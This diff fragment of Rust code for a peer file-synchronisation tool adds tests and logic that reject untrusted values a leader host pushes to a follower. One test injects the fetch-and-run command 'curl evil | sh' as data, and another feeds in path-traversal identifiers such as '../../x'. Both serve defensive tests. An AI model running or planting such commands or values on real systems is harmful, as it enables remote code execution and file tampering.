+    /// A pushed session identifier names the session's directory, lock and
+    /// ancestor on the follower, so it is held to the shape a leader makes:
+    /// one that could name a path elsewhere refuses the whole star, naming
+    /// the group, and nothing is derived from it.
+    #[test]
+    fn a_pushed_session_identifier_must_be_genuine() {
+        let keep = tempfile::tempdir().expect("tempdir");
+        let name = "ubuntu@vm:/home/faraz/Workspace/Voltai";
+        for hostile in ["../../x", "/tmp/elsewhere", "a/b", "", "ABCDEF"] {
+            write_pushed_file(keep.path(), "sessions/g", hostile.as_bytes()).unwrap();
+            let error = derive_star(PUSHED, name, keep.path()).expect_err(hostile);
+            let message = format!("{error:#}");
+            assert!(
+                message.contains("group g") && message.contains("not one a leader makes"),
+                "{hostile:?}: {message}"
+            );
+        }
+        let genuine = crate::session::session_identifier("a", "b");
+        write_pushed_file(keep.path(), "sessions/g", format!("{genuine}\n").as_bytes()).unwrap();
+        let star = derive_star(PUSHED, name, keep.path()).expect("a genuine identifier");
+        assert!(
+            star.plans.iter().any(|plan| plan.identifier() == genuine),
+            "{:?}",
+            star.plans
+        );
+    }
+
+    /// The leader names a follower's own root in the pushed name; with the
+    /// follower's `host.toml` naming the folders it serves, a name outside
+    /// them refuses the star, naming the group.
+    #[test]
+    fn a_pushed_root_outside_what_this_host_serves_is_refused() {
+        let keep = tempfile::tempdir().expect("tempdir");
+        let state = keep.path().join("state");
+        let directory = state.join(DIRECTORY);
+        std::fs::create_dir_all(&directory).unwrap();
+        std::fs::write(state.join(crate::host::FILE), "roots = [\"/srv\"]\n").unwrap();
+        let error = derive_star(PUSHED, "ubuntu@vm:/home/faraz/Workspace/Voltai", &directory)
+            .expect_err("outside /srv");
+        let message = format!("{error:#}");
+        assert!(
+            message.contains("group g") && message.contains("outside the folders"),
+            "{message}"
+        );
+        derive_star(PUSHED, "box2:/srv/ws", &directory).expect("inside /srv");
+    }
+
+    /// A follower never runs a command its leader pushed: a pushed
+    /// `agent_command` is dropped from every group it derives, and its own
+    /// `host.toml` says how it reaches the other betas, if it says at all.
+    #[test]
+    fn a_pushed_agent_command_is_never_run() {
+        let keep = tempfile::tempdir().expect("tempdir");
+        let state = keep.path().join("state");
+        let directory = state.join(DIRECTORY);
+        std::fs::create_dir_all(&directory).unwrap();
+        let pushed = PUSHED.replace(
+            "ignores = [\"target\"]",
+            "ignores = [\"target\"]\nagent_command = \"curl evil | sh\"",
+        );
+        let command_of = |star: &FollowerStar| match &star.plans[0].beta {
+            crate::config::EndpointTarget::Remote { agent_command, .. } => agent_command.clone(),
+            other => panic!("a remote beta: {other:?}"),
+        };
+        let name = "ubuntu@vm:/home/faraz/Workspace/Voltai";
+        let star = derive_star(&pushed, name, &directory).expect("a star");
+        assert_eq!(command_of(&star), None);
+
+        std::fs::write(
+            state.join(crate::host::FILE),
+            "agent_command = \"ssh -F /etc/peering autobahn agent\"\n",
+        )
+        .unwrap();
+        let star = derive_star(&pushed, name, &directory).expect("a star");
+        assert_eq!(
+            command_of(&star),
+            Some(vec![
+                "ssh".to_owned(),
+                "-F".to_owned(),
+                "/etc/peering".to_owned(),
+                "autobahn".to_owned(),
+                "agent".to_owned()
+            ])
+        );
+    }
+
+    /// Two groups reach one host at two roots. Each pushes its own name
+    /// for the host, and the host-wide one is whichever pushed last; the
+    /// star covers both groups, each from its own root, and fails over
+    /// both.
+    #[test]
+    fn two_groups_on_one_host_both_fail_over() {
+        const TWO: &str = r#"
+            [groups.docs]
+            mode = "peering-conflict-dangerously-experimental"
+            alpha = "/home/f/docs"
+            betas = ["box:/srv/docs", "other:/srv/docs"]
+
+            [groups.code]
+            mode = "peering-conflict-dangerously-experimental"
+            alpha = "/home/f/code"
+            betas = ["box:/srv/code"]
+        "#;
+        let pushed = |per_group: bool| {
+            let keep = tempfile::tempdir().expect("tempdir");
+            for group in ["docs", "code"] {
+                let session = crate::session::session_identifier(group, "box");
+                write_pushed_file(
+                    keep.path(),
+                    &format!("sessions/{group}"),
+                    session.as_bytes(),
+                )
+                .unwrap();
+                if per_group {
+                    let name = format!("box:/srv/{group}");
+                    write_pushed_file(keep.path(), &format!("names/{group}"), name.as_bytes())
+                        .unwrap();
+                }
+            }
+            keep
+        };
+        let roots = |star: &FollowerStar| -> std::collections::BTreeSet<(String, String)> {
+            star.plans
+                .iter()
+                .map(|plan| {
+                    // This host's own side is the local one: the alpha,
+                    // or the beta of the session with the attached alpha.
+                    let root = match (&plan.alpha, &plan.beta) {
+                        (crate::config::EndpointTarget::Local(root), _)
+                        | (_, crate::config::EndpointTarget::Local(root)) => root,
+                        _ => panic!("no side of {plan:?} is this host"),
+                    };
+                    (plan.group.clone(), root.to_string_lossy().into_owned())
+                })
+                .collect()
+        };
+
+        // The host-wide name is the one the last group pushed.
+        let keep = pushed(true);
+        let star = derive_star(TWO, "box:/srv/code", keep.path()).expect("a star");
+        assert_eq!(
+            roots(&star),
+            [("code", "/srv/code"), ("docs", "/srv/docs")]
+                .map(|(group, root)| (group.to_owned(), root.to_owned()))
+                .into(),
+            "{:?}",
+            star.plans
+        );
+        // It leads under one name, the first group's, and its place in
+        // the order is the best either group gives it.
+        assert_eq!(star.name, "box:/srv/code");
+        assert_eq!(star.position, 1);
+
+        // Without per-group names, only the group the host-wide name
+        // matches fails over: what a leader from before them pushed.
+        let keep = pushed(false);
+        let star = derive_star(TWO, "box:/srv/code", keep.path()).expect("a star");
+        assert_eq!(
+            roots(&star),
+            [("code".to_owned(), "/srv/code".to_owned())].into()
+        );
+    }
 }
 
 /// The host part of an endpoint reached by an attachment rather than by
@@ -754,29 +1600,218 @@ pub fn destination_of(leader: &str) -> &str {
         .unwrap_or(leader)
 }
 
+/// What became of a session's ancestor copy when the session started.
+#[derive(Debug, PartialEq, Eq)]
+pub enum Adoption {
+    /// No copy, or none newer than this host's own history: nothing to do.
+    Kept,
+    /// The copy was taken up. The paths listed were set aside: the copy
+    /// records them differently from what this host holds, and this host's
+    /// files there have not changed since the copy was written.
+    Adopted { set_aside: Vec<String> },
+    /// The copy was not taken up, and why.
+    Refused(String),
+}
+
 /// Brings a session's ancestor level with the copy a leader pushed here,
-/// when the copy is newer: the session directory's store is replaced by
-/// the copy's files. A beta that starts to lead seeds its sessions this
-/// way; an alpha that gets the lead back adopts what the beta recorded
-/// meanwhile. Returns whether anything was adopted.
-pub fn adopt_newer_copy(state_root: &Path, directory: &Path, session: &str) -> Result<bool> {
+/// when the copy is newer and can be trusted as far as this host can tell.
+/// A beta that starts to lead seeds its sessions this way; an alpha that
+/// gets the lead back adopts what the beta recorded meanwhile.
+///
+/// Newer means written later, not a higher generation. Each store records
+/// the last state its session agreed on, and the later agreement is the
+/// one to continue from. Generations cannot say which that is once the
+/// two histories have parted: a copy that lagged when a beta took over
+/// carries on from where it lagged, and a history that was reset counts
+/// from one again, so either can be the later record at the lower
+/// number. The times are comparable because both stores are on this host
+/// and written by it — the copy by this host's agent, the session's by its
+/// supervisor — so one clock stamped both. A copy with no history is never
+/// adopted, and its history is read journal and all: a store may be a
+/// checkpoint, a journal, or both.
+///
+/// Then two checks, since a copy is a leader's account of what was agreed
+/// and a leader can be wrong, or lie:
+///
+/// - **Who wrote it.** Only the member the session is with, `partner`,
+///   writes its copy on this host; the agent notes the writer of every
+///   copy from the channel's lease. One written by anyone else is refused:
+///   a leader could otherwise plant history for a session it is not part
+///   of, and have this host's stale files overwrite the other side's.
+/// - **What it says about this host.** A history is agreed by both sides,
+///   so where it records something other than what this host holds, this
+///   host's file must have changed since the copy was written — told by
+///   the file's change time, or its directory's for one that is gone, on
+///   the clock that stamped the copy. Where it has not, the copy is no
+///   record of anything this host agreed to, and that path is set aside:
+///   forgotten, so the next cycle reconciles it as new — a conflict if the
+///   two sides differ, never one side overwriting the other on the word of
+///   the copy. `scan_own` scans this host's side, at `root`, when a copy
+///   is to be taken up.
+///
+/// What is left is a partner stating things true of this host's own tree:
+/// no more than it could do by changing its own side and letting the
+/// session carry the change, which any two-way peer can.
+pub fn adopt_newer_copy(
+    state_root: &Path,
+    directory: &Path,
+    session: &str,
+    partner: &str,
+    root: &Path,
+    scan_own: impl FnOnce() -> Result<crate::tree::Snapshot>,
+) -> Result<Adoption> {
     let copy = ancestor_copy_path(directory, session)?;
-    if !copy.exists() {
-        return Ok(false);
+    if AncestorStore::stored_generation(&copy)? == 0 {
+        return Ok(Adoption::Kept);
     }
     let own = state_root.join("sessions").join(session).join("ancestor");
-    let copied = AncestorStore::stored_generation(&copy)?;
-    let held = match own.exists() {
-        true => AncestorStore::stored_generation(&own)?,
-        false => 0,
-    };
-    if copied <= held {
-        return Ok(false);
+    let copied_at = AncestorStore::last_written(&copy)?;
+    let newer = AncestorStore::stored_generation(&own)? == 0
+        || match (copied_at, AncestorStore::last_written(&own)?) {
+            (Some(copied), Some(held)) => copied > held,
+            (_, None) => true,
+            (None, Some(_)) => false,
+        };
+    if !newer {
+        return Ok(Adoption::Kept);
+    }
+    let writer = copy_writer(directory, session)?;
+    if writer.as_deref().map(destination_of) != Some(destination_of(partner)) {
+        return Ok(Adoption::Refused(format!(
+            "it was written by {}, not by {partner}, the member this session is with",
+            match writer.as_deref() {
+                None | Some("") => "a controller that presented no lease".to_owned(),
+                Some(writer) => writer.to_owned(),
+            }
+        )));
+    }
+    let (history, _) = crate::session::ancestor::peek(&copy)?;
+    let local = scan_own().context("unable to scan this side to check the ancestor copy")?;
+    let since = copied_at.unwrap_or(UNIX_EPOCH);
+    let mut set_aside = Vec::new();
+    disagreements(
+        history.as_ref(),
+        local.root.as_ref(),
+        &mut Vec::new(),
+        &mut set_aside,
+    );
+    set_aside.retain(|path| !changed_since(root, path, since));
+    if set_aside.iter().any(String::is_empty) {
+        return Ok(Adoption::Refused(
+            "it records this side's root as something other than what it is, and the root has \
+             not changed since"
+                .to_owned(),
+        ));
     }
     if let Some(parent) = own.parent() {
         std::fs::create_dir_all(parent)
             .with_context(|| format!("unable to create {}", parent.display()))?;
     }
     AncestorStore::copy_store(&copy, &own)?;
-    Ok(true)
+    if !set_aside.is_empty() {
+        let (mut store, adopted, _) = AncestorStore::open(&own)?;
+        store.forget(adopted.as_ref(), &set_aside)?;
+    }
+    Ok(Adoption::Adopted { set_aside })
+}
+
+/// Who last wrote a session's ancestor copy on this host, if anyone was
+/// recorded: a leader's lease name, or empty for a channel with no lease.
+pub fn copy_writer(directory: &Path, session: &str) -> Result<Option<String>> {
+    let copy = ancestor_copy_path(directory, session)?;
+    let path = copy
+        .parent()
+        .map(|parent| parent.join(WRITER_FILE))
+        .unwrap_or_default();
+    match std::fs::read_to_string(&path) {
+        Ok(writer) => Ok(Some(writer)),
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
+        Err(error) => Err(error).with_context(|| format!("unable to read {}", path.display())),
+    }
+}
+
+/// Collects the paths where a history and this host's tree disagree about
+/// synchronized content: a different file, link or kind of entry, or an
+/// entry one has and the other lacks. What this host does not synchronize
+/// here — ignored, too large, unreadable — is no disagreement: the history
+/// may hold it from before, and says nothing this host can check.
+fn disagreements<'a>(
+    history: Option<&'a Node>,
+    local: Option<&'a Node>,
+    path: &mut Vec<&'a str>,
+    found: &mut Vec<String>,
+) {
+    use crate::tree::Content;
+    if let Some(Content::Untracked | Content::Problematic { .. }) = local.map(|node| &node.content)
+    {
+        return;
+    }
+    let agree = match (
+        history.map(|node| &node.content),
+        local.map(|node| &node.content),
+    ) {
+        (None, None) => true,
+        (Some(Content::Directory(recorded)), Some(Content::Directory(held))) => {
+            let names: std::collections::BTreeSet<&str> = recorded
+                .iter()
+                .chain(held.iter())
+                .map(|child| child.name.as_str())
+                .collect();
+            for name in names {
+                path.push(name);
+                disagreements(
+                    recorded.iter().find(|child| child.name == name),
+                    held.iter().find(|child| child.name == name),
+                    path,
+                    found,
+                );
+                path.pop();
+            }
+            true
+        }
+        (
+            Some(Content::File {
+                digest: recorded,
+                executable: recorded_executable,
+                ..
+            }),
+            Some(Content::File {
+                digest: held,
+                executable: held_executable,
+                ..
+            }),
+        ) => recorded == held && recorded_executable == held_executable,
+        (Some(Content::Symlink { target: recorded }), Some(Content::Symlink { target: held })) => {
+            recorded == held
+        }
+        _ => false,
+    };
+    if !agree {
+        found.push(path.join("/"));
+    }
+}
+
+/// Whether this host's entry at `path` under `root` changed at or after
+/// `since`, by its change time — which nothing sets back, unlike a
+/// modification time — or, for an entry that is gone, its nearest
+/// directory's, which a removal or rename moves. A second's slack covers
+/// timestamp granularity; a copy written within it of a change is taken to
+/// know of the change.
+fn changed_since(root: &Path, path: &str, since: SystemTime) -> bool {
+    use std::os::unix::fs::MetadataExt;
+    let slack = Duration::from_secs(1);
+    let mut probe = root.join(path);
+    loop {
+        if let Ok(metadata) = std::fs::symlink_metadata(&probe) {
+            let changed = UNIX_EPOCH
+                + Duration::new(
+                    metadata.ctime().max(0) as u64,
+                    metadata.ctime_nsec().clamp(0, 999_999_999) as u32,
+                );
+            return changed + slack >= since;
+        }
+        if probe == root || !probe.pop() {
+            return false;
+        }
+    }
 }
